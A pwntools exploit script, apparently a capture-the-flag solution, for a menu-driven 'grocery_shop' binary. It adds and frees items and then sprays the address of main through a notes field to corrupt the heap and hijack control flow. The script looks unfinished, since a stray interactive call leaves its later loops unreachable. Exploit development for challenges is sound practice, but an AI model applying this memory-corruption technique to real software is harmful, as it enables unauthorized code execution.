#!/usr/bin/env python3

from pwn import *

exe = ELF("./grocery_shop")

context.binary = exe

var = """
b *0x4027b9
b ShowCatalogue(Catalogue&)
b *0x000403be5
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="""
                       b main
                       c
                       """)
    else:
        r = remote("addr", 1337)

    return r

items = {
    100: b"soap",
    101: b"broom",
    300: b"straws",
    400: b"milk",
    500: b"chips",
    600: b"oranges",
    601: b"carrots"
}

def add_item(r, id):
    r.sendlineafter(b"> ", b"add item")
    r.sendlineafter(b"> ", id)

def remove_item(r, id):
    r.sendlineafter(b"> ", b"remove item")
    r.sendlineafter(b"> ", id)

def set_count(r, id, count):
    r.sendlineafter(b"> ", b"set count")
    r.sendlineafter(b"> ", id)
    r.sendlineafter(b"> ", count)

def set_notes(r, id, notes):
    r.sendlineafter(b"> ", b"set notes")
    r.sendlineafter(b"> ", id)
    r.sendlineafter(b"> ", notes)

def show_cart(r):
    r.sendlineafter(b"> ", b"show cart")

def show_catalogue(r):
    r.sendlineafter(b"> ", b"show catalogue")

def pay(r):
    r.sendlineafter(b"> ", b"pay")

def exit(r):
    r.sendlineafter(b"> ", b"exit")

def main():
    r = conn()

    MAIN = exe.symbols['main']
    memcpy = 0x40a0a0
    print(f"MAIN @ {hex(MAIN)}")

    add_item(r, b"601")
    add_item(r, b"600")
    remove_item(r, b"601")
    remove_item(r, b"600")
    set_notes(r, b"300", p64(MAIN)*0x500)
    show_catalogue(r)
    r.interactive()
    for id, name in items.items():
        if not id == 100 and not id == 101 and not id == 300:
            add_item(r, str(id).encode())
            remove_item(r, str(id).encode())
    for id, name in items.items():
        add_item(r, str(id).encode())

    #add_item(r, b"100")
    #set_notes(r, b"100", b"A"*1000)
    
    r.interactive()


if __name__ == "__main__":
    main()
